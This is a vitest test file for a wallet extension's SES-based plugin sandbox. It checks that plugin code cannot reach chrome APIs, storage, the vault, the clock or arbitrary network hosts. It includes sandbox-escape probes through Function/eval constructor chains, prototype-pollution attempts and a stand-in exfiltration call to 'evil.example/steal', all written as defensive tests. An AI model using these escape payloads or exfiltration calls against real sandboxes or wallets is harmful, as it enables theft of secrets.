/**
 * Isolation: plugin code runs under real SES (lockdown + Compartment) through the real sandbox runtime, and
 * tries every way we know to reach chrome.*, storage, the vault, the network or the host realm.
 *
 * The host realm here is given decoys (globalThis.chrome, localStorage, indexedDB, __clipVault) standing in
 * for what an extension page has; none of them may be visible to the plugin.
 */
import { ses } from "./ses.js";
import { beforeAll, describe, expect, it, vi } from "vitest";
import { PluginHost, PluginError } from "../src/host.js";
import { installed, memoryChannels } from "./helpers.js";
import type { InsightInput } from "../src/messages.js";

const REQUEST: InsightInput = {
  origin: "https://app.example",
  title: "Send 1 ETH to 0x000000000000000000000000000000000000dEaD",
  lines: [{ label: "To", value: "0x000000000000000000000000000000000000dEaD" }],
  balanceChanges: [{ asset: "ETH", delta: "-1000000000000000000" }],
  networkId: "eip155:11155111",
  account: "0x9858EfFD232B4033E47d90003D41EC34EcaEda94",
};

beforeAll(() => {
  const g = globalThis as Record<string, unknown>;
  g.chrome = { storage: { local: { get: () => "SECRET-STORAGE" } }, runtime: { id: "ext" } };
  g.browser = g.chrome;
  g.localStorage = { getItem: () => "SECRET-LS" };
  g.indexedDB = { open: () => "SECRET-IDB" };
  g.__clipVault = { phrase: "SECRET-PHRASE" };
});

/** Runs `exprs` inside a plugin and returns what each evaluated to (or "threw: …"). */
async function probe(exprs: string[]): Promise<string[]> {
  const out: string[] = [];
  for (let i = 0; i < exprs.length; i += 5) {
    const batch = exprs.slice(i, i + 5);
    const source = `
      const exprs = ${JSON.stringify(batch)};
      module.exports.onTransaction = async () => ({
        lines: exprs.map((e, i) => {
          let v;
          try { v = String((0, eval)(e)); } catch (err) { v = "threw: " + (err && err.name); }
          return { label: "p" + i, value: v.slice(0, 200) || "(empty)" };
        }),
      });`;
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory });
    await host.start(installed(source, { transactionInsight: true }));
    const [ins] = await host.insights(REQUEST);
    out.push(...ins!.lines.map((l) => l.value));
    host.stopAll();
  }
  return out;
}

describe("a plugin can't reach the extension, storage, the vault or the network", () => {
  it("sees no chrome.*, browser.*, DOM, storage, network, timers or Node globals", async () => {
    const names = [
      "chrome", "browser", "window", "document", "self", "parent", "top", "frames", "opener", "postMessage",
      "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "navigator", "location",
      "localStorage", "sessionStorage", "indexedDB", "caches", "crypto",
      "setTimeout", "setInterval", "queueMicrotask", "importScripts", "Worker", "SharedArrayBuffer",
      "process", "require", "global", "Buffer", "__clipVault",
    ];
    const got = await probe(names.map((n) => `typeof ${n}`));
    expect(Object.fromEntries(names.map((n, i) => [n, got[i]]))).toEqual(Object.fromEntries(names.map((n) => [n, "undefined"])));
  });

  it("can't climb out through Function, eval or constructor chains", async () => {
    const got = await probe([
      `Function("return typeof chrome")()`,
      `(0, eval)("typeof localStorage")`,
      `[].constructor.constructor("return globalThis")().__clipVault`,
      `Object.getPrototypeOf(async function(){}).constructor("return 1")`,
      `(function(){ return typeof this })()`,
      `globalThis.chrome`,
      `Reflect.ownKeys(globalThis).filter(k => typeof k === "string" && /chrome|vault|Storage|indexed/i.test(k)).length`,
    ]);
    expect(got[0]).toBe("undefined");
    expect(got[1]).toBe("undefined");
    expect(got[2]).toMatch(/^threw: TypeError|^undefined$/);
    expect(got[3]).toMatch(/^threw: TypeError/);
    expect(got[4]).toBe("undefined");
    expect(got[5]).toBe("undefined");
    expect(got[6]).toBe("0");
  });

  it("can't tamper with shared intrinsics (prototype pollution throws, host is unaffected)", async () => {
    const got = await probe([
      `(() => { "use strict"; Object.prototype.polluted = 1; return "wrote"; })()`,
      `(() => { "use strict"; Array.prototype.map = () => []; return "wrote"; })()`,
      `(() => { "use strict"; JSON.parse = () => ({}); return "wrote"; })()`,
      `Object.isFrozen(Object.prototype)`,
    ]);
    expect(got.slice(0, 3).every((v) => v.startsWith("threw: TypeError"))).toBe(true);
    expect(got[3]).toBe("true");
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  it("gets no clock or randomness (no covert timing channel)", async () => {
    const got = await probe([`Date.now()`, `new Date().getTime()`, `Math.random()`]);
    expect(got[0]).toMatch(/NaN|threw/);
    expect(got[1]).toMatch(/NaN|threw/);
    expect(got[2]).toMatch(/threw/);
  });

  it("dynamic import() is refused at load time", async () => {
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory });
    const src = `module.exports.onTransaction = async () => { const m = await import("@clip-wallet/vault"); return {}; };`;
    await expect(host.start(installed(src, { transactionInsight: true }))).rejects.toBeInstanceOf(PluginError);
  });

  it("without the network permission there is no clip.fetch; with it, only the manifest's origins are reachable", async () => {
    const probeClip = `module.exports.onTransaction = async () => ({ lines: [{ label: "clip", value: Object.keys(clip).join(",") || "(none)" }] });`;
    const a = memoryChannels(ses);
    const h1 = new PluginHost({ channels: a.factory });
    await h1.start(installed(probeClip, { transactionInsight: true }));
    expect((await h1.insights(REQUEST))[0]!.lines[0]!.value).toBe("(none)");

    const calls: { url: string; init: RequestInit | undefined }[] = [];
    const net = vi.fn(async (url: RequestInfo | URL, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      return new Response("label=Treasury");
    }) as unknown as typeof fetch;
    const src = `
      module.exports.onTransaction = async () => {
        const ok = await clip.fetch("https://api.labels.example/v1/a?x=1");
        const other = await clip.fetch("https://evil.example/steal");
        const http = await clip.fetch("http://api.labels.example/v1");
        return { lines: [
          { label: "ok", value: ok.ok + ":" + ok.body },
          { label: "other", value: other.ok + ":" + other.status },
          { label: "http", value: http.ok + ":" + http.status },
        ] };
      };`;
    const b = memoryChannels(ses);
    const h2 = new PluginHost({ channels: b.factory, fetch: net });
    await h2.start(installed(src, { transactionInsight: true, network: ["https://api.labels.example"] }));
    const [ins] = await h2.insights(REQUEST);
    expect(ins!.lines.map((l) => l.value)).toEqual(["true:label=Treasury", "false:0", "false:0"]);
    expect(calls).toHaveLength(1);
    expect(calls[0]!.url).toBe("https://api.labels.example/v1/a?x=1");
    expect(calls[0]!.init).toMatchObject({ method: "GET", credentials: "omit", redirect: "error" });
  });

  it("is only called for capabilities it was granted", async () => {
    const src = `module.exports.onTransaction = async () => ({ lines: [{ label: "x", value: "y" }] });
                 module.exports.onNameLookup = async () => ({ address: "0x1", family: "evm" });`;
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory });
    await host.start(installed(src, { nameResolution: { suffixes: [".label"] } }));
    expect(await host.insights(REQUEST)).toEqual([]);
    expect(await host.resolveName("a.label")).toMatchObject({ address: "0x1", from: "from Test plugin" });
    expect(await host.resolveName("a.other")).toBeNull();
  });

  it("refuses to start a bundle that changed since install", async () => {
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory });
    const p = installed(`module.exports.onTransaction = async () => ({});`, { transactionInsight: true });
    await expect(host.start({ ...p, source: p.source + "/* tampered */" })).rejects.toMatchObject({ code: "tampered" });
  });
});

describe("approvals: plugin output is bounded and always labelled", () => {
  it("labels every note with the plugin's name, kept apart from the wallet's own lines", async () => {
    const src = `module.exports.onTransaction = async () => ({ lines: [{ label: "Clip Wallet", value: "This is safe" }], warnings: [{ level: "info", message: "Verified by Clip" }] });`;
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory });
    await host.start(installed(src, { transactionInsight: true }, "clip-plugin-x", "Sneaky"));
    const [ins] = await host.insights(REQUEST);
    expect(ins).toMatchObject({ pluginName: "Sneaky", from: "from Sneaky", lines: [{ label: "Clip Wallet", value: "This is safe" }] });
  });

  it("drops oversized, malformed or disguised output", async () => {
    const bad = [
      `({ lines: Array.from({ length: 6 }, (_, i) => ({ label: "l" + i, value: "v" })) })`,
      `({ lines: [{ label: "x", value: "y", extra: 1 }] })`,
      `({ lines: [{ label: "To", value: "0xGOOD\\u202E0xBAD" }] })`,
      `({ warnings: [{ level: "critical", message: "x" }] })`,
      `({ lines: [{ label: "x".repeat(41), value: "y" }] })`,
      `(() => { throw new Error("boom"); })()`,
    ];
    for (const out of bad) {
      const { factory } = memoryChannels(ses);
      const host = new PluginHost({ channels: factory });
      await host.start(installed(`module.exports.onTransaction = async () => ${out};`, { transactionInsight: true }));
      expect(await host.insights(REQUEST)).toEqual([]);
      host.stopAll();
    }
  });

  it("an approval never waits on a plugin that doesn't answer; it is stopped after repeated timeouts", async () => {
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory, callTimeoutMs: 30 });
    const p = installed(`module.exports.onTransaction = () => new Promise(() => {});`, { transactionInsight: true });
    await host.start(p);
    expect(await host.insights(REQUEST)).toEqual([]);
    expect(await host.insights(REQUEST)).toEqual([]);
    expect(host.isRunning(p.id)).toBe(false);
  });

  it("notifications are rate-limited and labelled", async () => {
    let t = 1_000_000;
    const seen: string[] = [];
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory, now: () => t, onNotify: (n) => seen.push(`${n.from}: ${n.text}`) });
    const src = `module.exports.onTransaction = async () => { for (let i = 0; i < 10; i++) clip.notify("ping " + i); return {}; };`;
    await host.start(installed(src, { transactionInsight: true, notifications: true }, "clip-plugin-n", "Pinger"));
    await host.insights(REQUEST);
    await new Promise((r) => setTimeout(r, 5));
    expect(seen).toEqual(["from Pinger: ping 0", "from Pinger: ping 1", "from Pinger: ping 2"]);
    t += 3600_000;
    await host.insights(REQUEST);
    await new Promise((r) => setTimeout(r, 5));
    expect(seen).toHaveLength(6);
  });

  it("a plugin without the notifications permission has no clip.notify", async () => {
    const { factory, log } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory });
    await host.start(installed(`module.exports.onTransaction = async () => { clip.notify("x"); return {}; };`, { transactionInsight: true }));
    expect(await host.insights(REQUEST)).toEqual([]);
    expect(log.some((e) => (e.msg as { type: string }).type === "notify")).toBe(false);
  });
});

/** A response body streamed in 64 KB chunks of `byte`; `pulled()` says how much the reader actually took. */
function streamed(total: number, byte = 0x61) {
  let sent = 0;
  let cancelled = false;
  const chunk = new Uint8Array(65_536).fill(byte);
  const body = new ReadableStream<Uint8Array>({
    pull(c) {
      if (sent >= total) return c.close();
      const n = Math.min(chunk.length, total - sent);
      sent += n;
      c.enqueue(chunk.slice(0, n));
    },
    cancel() {
      cancelled = true;
    },
  }, { highWaterMark: 0 }); // no read-ahead: `sent` is exactly what the reader asked for
  return { response: new Response(body), pulled: () => sent, cancelled: () => cancelled };
}

describe("audit PLG-02: sizes are enforced while streaming, and what installs can start", () => {
  const fetchOnce = `module.exports.onTransaction = async () => {
    const r = await clip.fetch("https://api.labels.example/v1");
    return { lines: [{ label: "r", value: r.ok + ":" + r.status + ":" + r.body.length }] };
  };`;

  it("a plugin fetch stops reading past 256 KB and fails, instead of reading the whole body", async () => {
    const big = streamed(8_000_000);
    const net = (async () => big.response) as unknown as typeof fetch;
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory, fetch: net });
    await host.start(installed(fetchOnce, { transactionInsight: true, network: ["https://api.labels.example"] }));
    const [ins] = await host.insights(REQUEST);
    expect(ins!.lines[0]!.value).toBe("false:0:0");
    expect(big.pulled()).toBeLessThanOrEqual(256_000 + 65_536);
    expect(big.cancelled()).toBe(true);
  });

  it("a body under the cap arrives whole, even when JSON escaping makes the message larger than the body", async () => {
    const quotes = streamed(200_000, 0x22); // 200 000 '"' characters: twice that once JSON-escaped
    const net = (async () => quotes.response) as unknown as typeof fetch;
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory, fetch: net });
    await host.start(installed(fetchOnce, { transactionInsight: true, network: ["https://api.labels.example"] }));
    const [ins] = await host.insights(REQUEST);
    expect(ins!.lines[0]!.value).toBe("true:200:200000");
  });

  it("a bundle between 256 KB and the 1 MB install limit starts", async () => {
    const pad = `/*${"x".repeat(700_000)}*/\n`;
    const src = `${pad}module.exports.onTransaction = async () => ({ lines: [{ label: "big", value: "started" }] });`;
    const { factory } = memoryChannels(ses);
    const host = new PluginHost({ channels: factory, loadTimeoutMs: 3000 });
    await host.start(installed(src, { transactionInsight: true }));
    expect((await host.insights(REQUEST))[0]!.lines[0]!.value).toBe("started");
  });
});
